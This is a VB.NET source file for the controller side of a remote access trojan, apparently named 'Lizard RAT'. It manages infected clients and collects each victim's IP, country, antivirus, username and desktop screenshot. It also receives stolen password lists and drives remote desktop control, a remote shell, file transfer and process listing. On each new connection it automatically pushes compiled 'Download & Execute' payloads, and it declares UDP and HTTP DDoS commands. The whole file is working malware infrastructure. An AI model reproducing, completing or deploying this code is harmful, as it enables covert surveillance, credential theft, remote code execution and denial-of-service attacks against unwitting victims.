Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.IO
Imports System.Net
Imports System.Reflection
Imports System.CodeDom.Compiler
Imports System.Text
Imports NATUPNPLib
Imports RWXServer.NetSeal

Public Class frmMain

#Region " Win32 Calls "

    <DllImport("kernel32.dll", EntryPoint:="MoveFileEx")>
    Private Shared Function MoveFileEx(
ByVal fileName As String,
ByVal newName As String,
ByVal flags As UInteger) As Boolean
    End Function

    <DllImport("advapi32.dll", EntryPoint:="OpenProcessToken")>
    Private Shared Function OpenToken(
ByVal handle As IntPtr,
ByVal access As UInteger,
ByRef token As IntPtr) As Boolean
    End Function

    <DllImport("advapi32.dll", EntryPoint:="LookupPrivilegeValue")>
    Private Shared Function GetPrivilegeID(
ByVal machine As String,
ByVal name As String,
ByRef luid As Long) As Boolean
    End Function

    <DllImport("advapi32.dll", EntryPoint:="AdjustTokenPrivileges")>
    Private Shared Function SetPrivilege(
ByVal token As IntPtr,
ByVal release As Boolean,
ByRef newState As TokenPrivilege,
ByVal zero1 As UInteger,
ByVal zero2 As IntPtr,
ByVal zero3 As IntPtr) As Boolean
    End Function

    <DllImport("advapi32.dll", EntryPoint:="InitiateSystemShutdownEx")>
    Private Shared Function ShutdownEx(
ByVal machine As String,
ByVal message As String,
ByVal timeout As UInteger,
ByVal force As Boolean,
ByVal reboot As Boolean,
ByVal reason As UInteger) As Boolean
    End Function

    <StructLayout(LayoutKind.Sequential, Pack:=1)>
    Private Structure TokenPrivilege
        Public Count As UInteger
        Public LUID As Long
        Public Flags As UInteger
    End Structure

#End Region

#Region " NetSeal Stuff "
    Private Seal As Broker

    Sub New()
        Seal = New Broker
        Seal.Initialize("A07A0000")
        InitializeComponent()
    End Sub

#End Region

#Region " Declarations "

    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Auto)>
    Friend Structure LVITEM
        Friend mask As Integer
        Friend iItem As Integer
        Friend subItem As Integer
        Friend state As Integer
        Friend stateMask As Integer
        <MarshalAs(UnmanagedType.LPTStr)>
        Friend lpszText As String
        Friend cchTextMax As Integer
        Friend iImage As Integer
        Friend lParam As IntPtr
        Friend iIndent As Integer
    End Structure

    Public frm As New Dictionary(Of String, Form)
    Public rdp As New Dictionary(Of String, Boolean)
    Public fm As New Dictionary(Of String, Boolean)
    Public consoles As New Dictionary(Of String, Boolean)
    Public ddosudp As New Dictionary(Of String, String)
    Public ddoshttp As New Dictionary(Of String, String)
    Public clients As Integer = 0
    Private sent As Long = 0
    Private received As Long = 0

    Public Modulename As String = ""
    Private SessionCreated As Boolean

    Private _FileString As String




    Friend Const LVM_FIRST As Integer = &H1000
    Friend Const LVM_GETITEMA As Integer = LVM_FIRST + 5
    Friend Const LVM_GETITEMW As Integer = LVM_FIRST + 75
    Friend Shared ReadOnly LVM_GETITEM As Integer =
    CInt(IIf(Marshal.SystemDefaultCharSize = 1, LVM_GETITEMA, LVM_GETITEMW))
    Friend Const LVM_SETITEMA As Integer = LVM_FIRST + 6
    Friend Const LVM_SETITEMW As Integer = LVM_FIRST + 76
    Friend Shared ReadOnly LVM_SETITEM As Integer =
    CInt(IIf(Marshal.SystemDefaultCharSize = 1, LVM_SETITEMA, LVM_SETITEMW))

    Friend Const LVM_SETEXTENDEDLISTVIEWSTYLE As Integer = LVM_FIRST + 54
    Friend Const LVIF_IMAGE As Integer = &H2
    Friend Const LVS_EX_SUBITEMIMAGES As Integer = &H2

    Friend Overloads Declare Auto Function SendMessage Lib "User32.dll" (ByVal hwnd As IntPtr, ByVal msg As Integer, ByVal wParam As IntPtr, ByRef lParam As LVITEM) As Integer
    Friend Overloads Declare Auto Function SendMessage Lib "User32.dll" (ByVal hwnd As IntPtr, ByVal msg As Integer, ByVal wParam As Integer, ByVal lParam As Integer) As Integer


    Private ini As modINI
    Private packer As New Pack
    Private RSA As New RSACryptoServiceProvider(2048)
    Private PublicKey As Byte()
    Private WithEvents Server As New ServerListener
    Private WithEvents DataServer As New ServerListener
    Private img As Image
    Private desks As ListBox = New ListBox
    Private api As Boolean = True
    Private api2 As Boolean = True
    Public dl As New SaveFileDialog
    Public upnpnat As New NATUPNPLib.UPnPNAT
    Public mappings As NATUPNPLib.IStaticPortMappingCollection = upnpnat.StaticPortMappingCollection



    Enum PacketHeader As Byte
        Handshake = 0
        Compile = 1
        Authorize = 2
        Ping = 3
        Ender = 4
        Alive = 5
        FunctionHandshake = 6
        PW = 7
        Process = 8
        CInfo = 9
        RDP = 10
        Mousemove = 11
        Mousedown = 29
        Mouseup = 30
        Quali = 12
        Off = 13
        Service = 14
        Software = 15
        StartConsole = 16
        Console = 17
        EndConsole = 18
        Drives = 19
        Content = 20
        Preview = 21
        PicPreview = 22
        Rename = 23
        Delete = 24
        Execute = 25
        Download = 26
        Upload = 27
        Done = 28
        StartUDP = 29
        StopUDP = 30
        StartHTTP = 31
        StopHTTP = 32
    End Enum

#End Region

#Region " Packet Senders "

    Private Sub SendHandshakePacket(client As ServerClient, publickey As Byte())
        SendToClient(client, CByte(PacketHeader.Handshake), publickey, client.EndPoint.ToString)
    End Sub

    Private Sub SendPingPacket(client As ServerClient)
        SendToClient(client, CByte(PacketHeader.Ping))
    End Sub

    Private Sub SendAlivePacket(client As ServerClient)
        SendToClient(client, CByte(PacketHeader.Alive))
    End Sub

    Private Sub SendAuthorizePacket(client As ServerClient, str As String)
        SendToClient(client, CByte(PacketHeader.Authorize), str)
    End Sub

    Private Sub SendCompilePacket(client As ServerClient, source As String, host As String, port As String, endpointer As String)
        SendToClient(client, CByte(PacketHeader.Compile), source, host, port, endpointer)
    End Sub

    Public Sub SendAnyPacket(endpoint As String, ParamArray values As Object())
        For Each c As ServerClient In Server.Clients
            If c.EndPoint.ToString = endpoint.ToString Then
                SendToClient(c, values)
                Exit Sub
            End If
        Next
        lvremove(lstConnections, endpoint)
        deskremove(endpoint)
    End Sub

    Public Sub SendAnyDataPacket(endpoint As String, ParamArray values As Object())
        For Each c As ServerClient In DataServer.Clients
            If c.EndPoint.ToString = endpoint.ToString Then
                SendToClient(c, values)
            End If
        Next
    End Sub

#End Region

#Region " Packet Handlers "

    Private Async Function HandleAuthorizePacket(client As ServerClient, values As Object()) As Task
        Dim lvi As New ListViewItem
        Dim data As Byte() = DirectCast(values(1), Byte())

        Dim params As Object() = packer.Deserialize(data)
        Dim ip() As String = client.EndPoint.ToString.Split(":")
        lstConnections.Invoke(Sub() lvaddgroup(lstConnections, params(7).ToString))
        Try
            lvi.Text = DirectCast(ip(0), String)
            lvi.ImageKey = (Countrycode(ip(0)) & ".png").ToLower
            lvi.SubItems.Add("n/a")
            lvi.SubItems.Add(DirectCast(params(0), String))
            lvi.SubItems.Add(Country(ip(0)))
            If DirectCast(params(1), String) <> "" Then
                lvi.SubItems.Add(DirectCast(params(1), String))
            Else
                lvi.SubItems.Add("No AV Detected")
            End If
            lvi.SubItems.Add(DirectCast(params(2), String))
            lvi.SubItems.Add(DirectCast(params(3), String))
            lvi.SubItems.Add(DirectCast(params(4), String))
            lvi.SubItems.Add("# of Cores: " & params(5))
            lvi.SubItems.Add(params(6).ToString)

            If lstConnections.InvokeRequired Then
                lstConnections.Invoke(Sub() lvadd(lstConnections, lvi, params(8).ToString))
            Else
                lvadd(lstConnections, lvi, params(8).ToString)
            End If


            If lstDesktops.InvokeRequired Then
                lstDesktops.Invoke(Sub() lvadddesktops(lstDesktops, params(6).ToString, createthumbnail(ConvertStringToImage(params(7)))))
            Else
                lvadddesktops(lstDesktops, params(6).ToString, createthumbnail(ConvertStringToImage(params(7))))
            End If

            Dim socket() As String = params(6).ToString.Split(":")
            Me.Invoke(Sub() showcon(params(2).ToString, ip(0), Country(ip(0)), socket(1)))
            clients += 1
            For Each c As ServerClient In Server.Clients
                If c.EndPoint.ToString = params(6).ToString Then
                    DirectCast(c.UserState, User).pingtimer = (DateTime.Now - New DateTime(1970, 1, 1)).TotalMilliseconds
                    SendPingPacket(c)
                    If lstOnConnect.Items.Count > 0 Then
                        For i = 0 To lstOnConnect.Items.Count - 1
                            Dim source As String = ""
                            Dim splitter() As String
                            Select Case lstOnConnect.Items(i).Text
                                Case "Download & Execute"
                                    Modulename = "DLExec"
                                    Dim MyTask As Task(Of String) = GetPage()
                                    source = Await MyTask
                                    source = source.Replace("[url]", lstOnConnect.Items(i).SubItems(2).Text)
                                    source = source.Replace("'/\", "")
                                    If params(4).ToString.Contains(lstOnConnect.Items(i).SubItems(1).Text) Or lstOnConnect.Items(i).SubItems(1).Text = "All" Then
                                        SendCompilePacket(c, source, "", "", "")
                                    End If
                                Case "Show Messagebox"
                                    Modulename = "Messagebox"
                                    Dim MyTask As Task(Of String) = GetPage()
                                    source = Await MyTask
                                    splitter = lstOnConnect.Items(i).SubItems(2).Text.Split(";")
                                    source = source.Replace("[text]", splitter(0))
                                    source = source.Replace("[title]", splitter(1))
                                    If params(4).ToString.Contains(lstOnConnect.Items(i).SubItems(1).Text) Or lstOnConnect.Items(i).SubItems(1).Text = "All" Then
                                        SendCompilePacket(c, source, "", "", "")
                                    End If
                                Case "Uninstall"
                                    Modulename = "Uninstall"
                                    Dim MyTask As Task(Of String) = GetPage()
                                    source = Await MyTask
                                    If params(4).ToString.Contains(lstOnConnect.Items(i).SubItems(1).Text) Or lstOnConnect.Items(i).SubItems(1).Text = "All" Then
                                        SendCompilePacket(c, source, "", "", "")
                                    End If
                                Case "Disconnect"
                                    If params(4).ToString.Contains(lstOnConnect.Items(i).SubItems(1).Text) Or lstOnConnect.Items(i).SubItems(1).Text = "All" Then
                                        SendAnyPacket(c.EndPoint.ToString, CByte(PacketHeader.Ender))
                                    End If
                            End Select
                        Next
                    End If
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try

        DirectCast(client.UserState, User).Authorized = True
        SendAuthorizePacket(client, "authorized")
        client.Disconnect()
    End Function

    Private Sub HandleCInfoPacket(client As ServerClient, values As Object())
        Dim data As Byte() = DirectCast(values(1), Byte())

        Dim params As Object() = packer.Deserialize(data)
        Try
            Dim ip() As String = params(0).ToString.Split(":")
            lblcIP.Text = "ClientIP (Socket): " & ip(0) & " (" & ip(1) & ")"
            lblcVersion.Text = "Clientversion: " & params(1).ToString
            lblcLocation.Text = "Clientlocation: " & params(2).ToString

            lblcUser.Text = "Username: " & params(3).ToString
            lblcPCName.Text = "MachineName: " & params(4).ToString
            lblcOS.Text = "OS Version: " & params(5).ToString
            lblcCountry.Text = "Country: " & Country(ip(0))
            If params(6).ToString <> "" Then
                lblcAV.Text = "Antivirus: " & params(6).ToString
            Else
                lblcAV.Text = "Antivirus: No AV Detected"
            End If
            lblcMonitor.Text = "Monitorcount: " & params(7).ToString

            pboxDesktop.Image = ConvertStringToImage(params(8).ToString)
            client.Disconnect()
        Catch : End Try
    End Sub

    Private Sub HandlePWPacket(client As ServerClient, values As Object())
        Dim data As Byte() = DirectCast(values(1), Byte())

        Dim params As Object() = packer.Deserialize(data)
        Dim delim1 As String() = New String(0) {"NewBlock-.-.-.-"}
        Dim delim2 As String() = New String(0) {"-.-.-.-"}
        Dim datablocks() As String
        Dim datas() As String
        Dim fr As x = frm(params(0))
        fr.lstPWs.Items.Clear()
        datablocks = params(1).ToString.Split(delim1, StringSplitOptions.None)
        For i = 1 To datablocks.Length - 1
            Dim lvi As New ListViewItem
            datas = datablocks(i).Split(delim2, StringSplitOptions.None)
            lvi.Text = datas(0)
            lvi.SubItems.Add(datas(1))
            lvi.SubItems.Add(datas(2))
            Try
                fr.lstPWs.Items.Add(lvi)
            Catch ex As Exception
                MsgBox(ex.ToString)
            End Try
        Next
        frm.Item(params(0)) = fr
        client.Disconnect()
    End Sub

    Private Sub HandleDownloadPacket(client As ServerClient, values As Object())
        If Not File.Exists(dl.FileName.ToString) Then
            File.Create(dl.FileName.ToString)
        End If
        Dim outputFilename As String = dl.FileName.ToString
        Dim fsOutput As New FileStream(outputFilename, FileMode.Append)

        If Not values.Length > 1 Then
            fsOutput.Close()
            Exit Sub
        End If
        Dim data As Byte() = DirectCast(values(1), Byte())
        Dim params As Object() = packer.Deserialize(data)
        Dim content As Byte() = System.Convert.FromBase64String(params(1).ToString)

        fsOutput.Write(content, 0, content.Length)
        Dim fr As x = frm(params(0))
        Dim prog As Integer = (DirectCast(params(2), Integer) / DirectCast(params(3), Integer)) * 100
        'For i = 0 To fr.lsttransfer.Items.Count - 1
        'If fr.lsttransfer.Items(i).Text = dl.FileName.ToString Then
        'fr.lsttransfer.Items(i).SubItems(2).Text = prog & "%"
        'End If
        'Next
        'System.IO.File.WriteAllBytes(dl.FileName.ToString, content)
    End Sub

    Private Sub HandlePicPreviewPacket(client As ServerClient, values As Object())
        Dim data As Byte() = DirectCast(values(1), Byte())
        Dim params As Object() = packer.Deserialize(data)

        Dim fr As x = frm(params(0))
        fr.txtPreview.Text = ""
        Try
            fr.picPreview.Image = ConvertStringToImage(params(1).ToString)
        Catch : End Try
    End Sub

    Private Sub HandlePreviewPacket(client As ServerClient, values As Object())
        Dim data As Byte() = DirectCast(values(1), Byte())
        Dim params As Object() = packer.Deserialize(data)

        Dim fr As x = frm(params(0))
        fr.picPreview.Image = Nothing
        Try
            fr.txtPreview.Text = params(1).ToString
        Catch : End Try
    End Sub

    Private Sub HandleDrivesPacket(client As ServerClient, values As Object())
        Dim data As Byte() = DirectCast(values(1), Byte())
        Dim params As Object() = packer.Deserialize(data)
        Dim datas As String()
        If fm(params(0).ToString) = False Then
            Try
                client.Disconnect()
                fm(params(0).ToString) = False
                fm.Remove(params(0).ToString)
                Exit Sub
            Catch : End Try
        End If
        Dim fr As x = frm(params(0).ToString)
        fr.FMEndpoint = client.EndPoint.ToString
        fr.lstDrives.Items.Clear()
        Try
            datas = params(1).ToString.Split("|")
            For i = 0 To datas.Length - 2
                fr.lstDrives.Items.Add(datas(i), 9)
            Next
        Catch : End Try
    End Sub

    Private Sub HandleContentPacket(client As ServerClient, values As Object())
        Dim data As Byte() = DirectCast(values(1), Byte())
        Dim params As Object() = packer.Deserialize(data)
        Dim datas As String()

        Dim fr As x = frm(params(0))
        fr.folder = fr.root
        fr.txtFolder.Text = fr.folder
        fr.lstContent.Items.Clear()
        fr.lstContent.Items.Add(".", 3)
        fr.lstContent.Items.Add("..", 3)
        datas = params(1).ToString.Split("|")
        For i = 0 To datas.Length - 1 Step 2
            Dim lvi As New ListViewItem
            Try
                Dim pic As String = "2"
                Dim extension() As String = datas(i).Split(".")
                If UBound(extension) > 0 Then
                    Select Case extension(UBound(extension)).ToLower
                        Case "txt"
                            pic = "8"
                        Case "rtf"
                            pic = "8"
                        Case "csv"
                            pic = "8"
                        Case "doc"
                            pic = "10"
                        Case "ini"
                            pic = "8"
                        Case "pdf"
                            pic = "7"
                        Case "jpg"
                            pic = "4"
                        Case "jpeg"
                            pic = "4"
                        Case "bmp"
                            pic = "4"
                        Case "gif"
                            pic = "4"
                        Case "png"
                            pic = "4"
                        Case "tiff"
                            pic = "4"
                        Case "mp3"
                            pic = "6"
                        Case "ogg"
                            pic = "6"
                        Case "wav"
                            pic = "6"
                        Case "flac"
                            pic = "6"
                        Case "m4a"
                            pic = "6"
                        Case "exe"
                            pic = "0"
                        Case "scr"
                            pic = "0"
                        Case "bat"
                            pic = "0"
                        Case "rar"
                            pic = "1"
                        Case "zip"
                            pic = "1"
                        Case "html"
                            pic = "12"
                        Case Else
                            pic = "2"
                    End Select
                End If
                If datas(i + 1) = "Folder" Then
                    pic = "3"
                End If
                If datas(i + 1) = "ERROR" Then
                    pic = "11"
                End If
                lvi.Text = datas(i).Replace(fr.folder, "")
                lvi.ImageKey = pic.ToString
                lvi.SubItems.Add(datas(i + 1))
                fr.lstContent.Items.Add(lvi)
            Catch : End Try
        Next
    End Sub

    Private Sub HandleProcessPacket(client As ServerClient, values As Object())
        Dim data As Byte() = DirectCast(values(1), Byte())

        Dim params As Object() = packer.Deserialize(data)
        Dim delim1 As String() = New String(0) {"NewBlock-.-.-.-"}
        Dim delim2 As String() = New String(0) {"-.-.-.-"}
        Dim datablocks() As String
        Dim datas() As String
        Dim fr As x = frm(params(0))
        fr.lstProc.Items.Clear()
        datablocks = params(1).ToString.Split(delim1, StringSplitOptions.None)
        For i = 1 To datablocks.Length - 1
            Dim lvi As New ListViewItem
            Try
                datas = datablocks(i).Split(delim2, StringSplitOptions.None)
                lvi.Text = datas(1)
                If datas(0) = "1" Then
                    lvi.ForeColor = Color.Red
                End If

                lvi.ImageKey = datas(0)
                lvi.SubItems.Add(datas(2))
                lvi.SubItems.Add(datas(3))

                fr.lstProc.Items.Add(lvi)
            Catch : End Try
        Next
        frm.Item(params(0)) = fr
        client.Disconnect()
    End Sub

    Private Sub HandleServicePacket(client As ServerClient, values As Object())
        Dim data As Byte() = DirectCast(values(1), Byte())

        Dim params As Object() = packer.Deserialize(data)
        Dim delim1 As String() = New String(0) {"NewBlock-.-.-.-"}
        Dim delim2 As String() = New String(0) {"-.-.-.-"}
        Dim datablocks() As String
        Dim datas() As String
        Dim fr As x = frm(params(0))
        fr.lstService.Items.Clear()
        datablocks = params(1).ToString.Split(delim1, StringSplitOptions.None)
        For i = 1 To datablocks.Length - 1
            Dim lvi As New ListViewItem
            datas = datablocks(i).Split(delim2, StringSplitOptions.None)
            lvi.Text = datas(0)
            lvi.ImageKey = "2"
            lvi.SubItems.Add(datas(1))
            lvi.SubItems.Add(datas(2))
            If datas(2).ToString.ToLower = "running" Then
                lvi.ForeColor = Color.Green
            End If
            Try
                fr.lstService.Items.Add(lvi)
            Catch ex As Exception
                MsgBox(ex.ToString)
            End Try
        Next
        frm.Item(params(0)) = fr
        client.Disconnect()
    End Sub

    Private Sub HandleSoftwarePacket(client As ServerClient, values As Object())
        Dim data As Byte() = DirectCast(values(1), Byte())

        Dim params As Object() = packer.Deserialize(data)
        Dim delim1 As String() = New String(0) {"NewBlock-.-.-.-"}
        Dim datablocks() As String
        Dim fr As x = frm(params(0))
        fr.lstSoftware.Items.Clear()
        datablocks = params(1).ToString.Split(delim1, StringSplitOptions.None)
        For i = 1 To datablocks.Length - 1
            Dim lvi As New ListViewItem
            lvi.Text = datablocks(i)
            lvi.ImageKey = "3"
            Try
                fr.lstSoftware.Items.Add(lvi)
            Catch ex As Exception
                MsgBox(ex.ToString)
            End Try
        Next
        frm.Item(params(0)) = fr
        client.Disconnect()
    End Sub

    Private Sub HandleRDPPacket(client As ServerClient, values As Object())
        Dim data As Byte() = DirectCast(values(1), Byte())

        Dim params As Object() = packer.Deserialize(data)
        Try
            Dim fr As x = frm(params(0).ToString)
            fr.rdpendpoint = client.EndPoint.ToString
            fr.picRDP.Image = ConvertStringToImage(params(1).ToString)
            fr.rdpx = params(2).ToString
            fr.rdpy = params(3).ToString
            If rdp.ContainsKey(params(0).ToString) Then
                If rdp(params(0).ToString) = True Then
                    SendAnyDataPacket(client.EndPoint.ToString, CByte(PacketHeader.RDP))
                Else
                    fr.picRDP.Image = Nothing
                End If
            Else
                rdp.Add(params(0).ToString, True)
                SendAnyDataPacket(client.EndPoint.ToString, CByte(PacketHeader.RDP))
            End If
            frm.Item(params(0).ToString) = fr
        Catch : End Try
    End Sub

    Private Async Function HandleHandshakePacket(client As ServerClient, values As Object()) As Task
        Dim data As Byte() = DirectCast(values(1), Byte())
        data = RSA.Decrypt(data, True)

        Dim params As Object() = packer.Deserialize(data)

        If chkPasswd.Checked = False Then
            Dim key As Byte() = DirectCast(params(0), Byte())
            Dim iv As Byte() = DirectCast(params(1), Byte())

            DirectCast(client.UserState, User).PrepareEncryption(key, iv)
            Dim source As String
            Dim reader As New modINI
            Modulename = "Auth"
            Dim MyTask As Task(Of String) = GetPage()
            source = Await MyTask
            SendCompilePacket(client, source, reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "host", "yourdns.noip.me"), reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "dataport", "778"), client.EndPoint.ToString)
        Else
            Dim reader As New modINI
            If reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "password", "") = params(2).ToString Then
                Dim key As Byte() = DirectCast(params(0), Byte())
                Dim iv As Byte() = DirectCast(params(1), Byte())

                DirectCast(client.UserState, User).PrepareEncryption(key, iv)
                Dim source As String
                Modulename = "Auth"
                Dim MyTask As Task(Of String) = GetPage()
                source = Await MyTask
                SendCompilePacket(client, source, reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "host", "yourdns.noip.me"), reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "dataport", "778"), client.EndPoint.ToString)
            End If
        End If
    End Function

    Private Sub HandleConsolePacket(client As ServerClient, values As Object())
        Dim data As Byte() = DirectCast(values(1), Byte())

        Dim params As Object() = packer.Deserialize(data)

        Dim fr As x = frm(params(0).ToString)
        Try
            fr.consoleendpoint = client.EndPoint.ToString
            If consoles.ContainsKey(params(0).ToString) Then
                If consoles(params(0).ToString) <> True Then
                    fr.txtConsole.Text = ""
                Else
                    fr.txtConsole.Text += params(1).ToString
                End If
            Else
                consoles.Add(params(0).ToString, True)
            End If
            fr.txtConsole.Select(fr.txtConsole.TextLength, 0)
            fr.txtConsole.ScrollToCaret()
            frm.Item(params(0).ToString) = fr
        Catch ex As Exception
            If consoles.ContainsKey(params(0).ToString) Then
                If fr.txtConsole.Text = "" And consoles(params(0).ToString) = True Then
                    fr.txtConsole.Text = "Lizard RAT Remote Console" & vbNewLine & vbNewLine
                End If
            End If
        End Try
    End Sub

    Private Sub HandleHandshakeAuthPacket(client As ServerClient, values As Object())
        Dim data As Byte() = DirectCast(values(1), Byte())
        data = RSA.Decrypt(data, True)

        Dim params As Object() = packer.Deserialize(data)

        Dim key As Byte() = DirectCast(params(0), Byte())
        Dim iv As Byte() = DirectCast(params(1), Byte())

        DirectCast(client.UserState, User).PrepareEncryption(key, iv)
        SendAuthorizePacket(client, "authorize")
    End Sub

    Private Sub HandleFuncHandshakePacket(client As ServerClient, values As Object())
        Try
            Dim data As Byte() = DirectCast(values(2), Byte())
            data = RSA.Decrypt(data, True)

            Dim params As Object() = packer.Deserialize(data)

            Dim key As Byte() = DirectCast(params(0), Byte())
            Dim iv As Byte() = DirectCast(params(1), Byte())

            DirectCast(client.UserState, User).PrepareEncryption(key, iv)
            SendAnyDataPacket(client.EndPoint.ToString, CByte(DirectCast(values(1), PacketHeader)))
        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try
    End Sub

    Private Sub HandlePingPacket(client As ServerClient)
        Dim pinger As Integer = (DateTime.Now - New DateTime(1970, 1, 1)).TotalMilliseconds - DirectCast(client.UserState, User).pingtimer
        For i = 0 To lstConnections.Items.Count - 1
            If lstConnections.Items(i).SubItems(9).Text = client.EndPoint.ToString Then
                lstConnections.Items(i).SubItems(1).Text = pinger.ToString & " ms"
                DirectCast(client.UserState, User).pingtimer = 0
                pinger = 0
                lstConnections.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent)
                Exit For
            End If
        Next
    End Sub

    Private Sub HandleDonePacket(client As ServerClient, values As Object())
        Dim data As Byte() = DirectCast(values(1), Byte())

        Dim params As Object() = packer.Deserialize(data)

        Dim fr As x = frm(params(0).ToString)
        SendAnyDataPacket(client.EndPoint.ToString, CByte(frmMain.PacketHeader.Content), fr.root)
    End Sub

#End Region

#Region " Helper Methods "

    Private Function GetIPAddress() As String

        Dim strHostName As String

        Dim strIPAddress As String



        strHostName = System.Net.Dns.GetHostName()

        strIPAddress = System.Net.Dns.GetHostByName(strHostName).AddressList(0).ToString()

        Return strIPAddress

    End Function

    Public Function format(ByVal input As Byte()) As String ' Codedom has maximum of possible chars per line so we are storing the string in multiple strings
        Dim out As New System.Text.StringBuilder ' Declaring a new StringBuilder to store the output string
        Dim base64data As String = System.Convert.ToBase64String(input) ' Get a readable String from the Byte Array
        Dim arr As String() = SplitString(base64data, 50000) ' Split the string into parts to fit in the Codedom-lines
        For i As Integer = 0 To arr.Length - 1 ' Looping thought each string in the array
            If i = arr.Length - 1 Then  ' If i equals the highest number
                out.Append(Chr(34) & arr(i) & Chr(34))
            Else 'I is smaller than arr.Length - 1 (i < arr.Length - 1)
                out.Append(Chr(34) & arr(i) & Chr(34) & " & _" & vbNewLine)
            End If
        Next
        Return out.ToString
    End Function

    Private Function SplitString(ByVal input As String, ByVal partsize As Long) As String()
        Dim amount As Long = Math.Ceiling(input.Length / partsize) 'Get Long value of the amount of parts using the formular (Length of Input / Length of Parts)
        Dim out(amount - 1) As String 'Declaring the Array to Return using the amount of Parts to define the size
        Dim currentpos As Long = 0 ' Declaring the Currentposition in the String
        For I As Integer = 0 To amount - 1 ' Looping thought each string in the array
            If I = amount - 1 Then ' If i equals the highest number
                Dim temp((input.Length - currentpos) - 1) As Char ' Declaring a temporary Array of Chars for storing the current Part of the String
                input.CopyTo(currentpos, temp, 0, (input.Length - currentpos)) ' Current part is everything left from the string
                out(I) = System.Convert.ToString(temp) ' Current part is appended to the output string
            Else 'I is smaller than amount - 1 (i < amount - 1)
                Dim temp(partsize - 1) As Char ' Declaring a temporary Array of Chars for storing the current Part if the String using the Size of a part (partsize)
                input.CopyTo(currentpos, temp, 0, partsize) ' Copying the current Part to the temp array
                out(I) = System.Convert.ToString(temp) ' Current part is appended to the output string
                currentpos += partsize ' Currentposition is increase to catch the next part in the next "round" of the loop
            End If
        Next
        Return out ' Return the Output String
    End Function

    Public Function Compile(ByVal Output As String, ByVal Source As String, ByVal Icon As String) As Boolean

        Dim Parameters As New CompilerParameters()
        Dim cResults As CompilerResults = Nothing
        Dim providerOptions As New Dictionary(Of String, String)()
        providerOptions.Add("CompilerVersion", "v2.0")
        Dim Compiler As CodeDomProvider = CodeDomProvider.CreateProvider("VB", providerOptions)
        Parameters.GenerateExecutable = True
        Parameters.TreatWarningsAsErrors = False
        Parameters.OutputAssembly = Output
        Parameters.ReferencedAssemblies.AddRange(New String() {"System.dll", "System.Drawing.dll", "System.Windows.Forms.dll", "System.Management.dll", "Microsoft.VisualBasic.dll", "System.ServiceProcess.dll", "System.Management.dll"})
        Parameters.CompilerOptions = "/target:winexe"
        If Not String.IsNullOrEmpty(Icon) Then
            File.Copy(Icon, "icon.ico")
            Parameters.CompilerOptions += " /win32icon:icon.ico"
        End If
        cResults = Compiler.CompileAssemblyFromSource(Parameters, Source)
        If cResults.Errors.Count > 0 Then
            For Each compile_error As CompilerError In cResults.Errors
                Dim [error] As CompilerError = compile_error
                'Console.Beep()
                MessageBox.Show("Error: " & [error].ErrorText & vbCr & vbLf & [error].Line)
            Next
            Return False
        End If
        If File.Exists("icon.ico") Then
            File.Delete("icon.ico")
        End If
        FileClose()
        Return True
    End Function

    Private Sub SendToClient(client As ServerClient, ParamArray args As Object())
        Try
            Dim data As Byte() = packer.Serialize(args)
            If DirectCast(client.UserState, User).SecureConnection Then
                data = DirectCast(client.UserState, User).encrypt(data)
            End If
            client.Send(data)
        Catch ex As Exception
            'MsgBox(ex.ToString)
        End Try
    End Sub



    Private Function createthumbnail(img As Image) As Image
        Try
            Dim image As Image = Nothing
            Dim imgthumb As Image = Nothing

            image = img
            imgthumb = image.GetThumbnailImage(256, 156, Nothing, New IntPtr())
            Return imgthumb
        Catch
            Return Nothing
        End Try
    End Function

    Public Function ConvertStringToImage(ByVal imageEncodedString As String) As System.Drawing.Image
        If String.IsNullOrEmpty(imageEncodedString) Then Return Nothing
        Dim mem As New System.IO.MemoryStream

        Dim buffer As Byte() = System.Convert.FromBase64String(imageEncodedString)
        mem.Write(buffer, 0, buffer.Length)
        Using mem

            mem.Position = 0

            img = System.Drawing.Image.FromStream(mem)
        End Using

        Return img
    End Function

    Private Sub removeform(endpoint As String)
        Try
            frm(endpoint).Close()
            frm.Remove(endpoint)
        Catch : End Try

    End Sub

    Private Sub lvremove(ByVal lv As ListView, ByVal ip As String)
        Try
            For i = 0 To lv.Items.Count - 1
                If lv.Items(i).SubItems(9).Text = ip Then
                    clients -= 1
                    lv.Items(i).Remove()
                    Exit For
                End If
            Next
        Catch : End Try
    End Sub

    Private Sub deskremove(ByVal ip As String)
        On Error Resume Next
        For i = 0 To lstDesktops.Items.Count
            If lstDesktops.Items(i).Text = ip Then
                lstDesktops.Items(i).Remove()
                Exit For
            End If
        Next
    End Sub

    Private Sub lvadd(ByVal lv As ListView, ByVal lvi As ListViewItem, group As String)
        lv.Items.Add(lvi)
        'ListView_SetSubItemImageIndex(lv.Handle, lv.Items.Count - 1, 1, 247)
        For i = 0 To lv.Groups.Count - 1
            If lv.Groups(i).Header = group Then
                lv.Items(lv.Items.Count - 1).Group = lv.Groups(i)
            End If
        Next
        lv.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent)
        lv.Columns(9).Width = 0
    End Sub

    Private Sub lvadddesktops(ByVal lv As ListView, ByVal text As String, ByVal img As Image)
        Desktops.Images.Add(img)
        lv.Items.Add(text, Desktops.Images.Count - 1)

    End Sub

    Private Sub lvaddgroup(ByVal lv As ListView, ByVal name As String)
        For i = 0 To lv.Groups.Count - 1
            If lv.Groups(i).Header = name Then
                Exit Sub
            End If
        Next
        lv.Groups.Add(name.Replace(" ", ""), name)
    End Sub

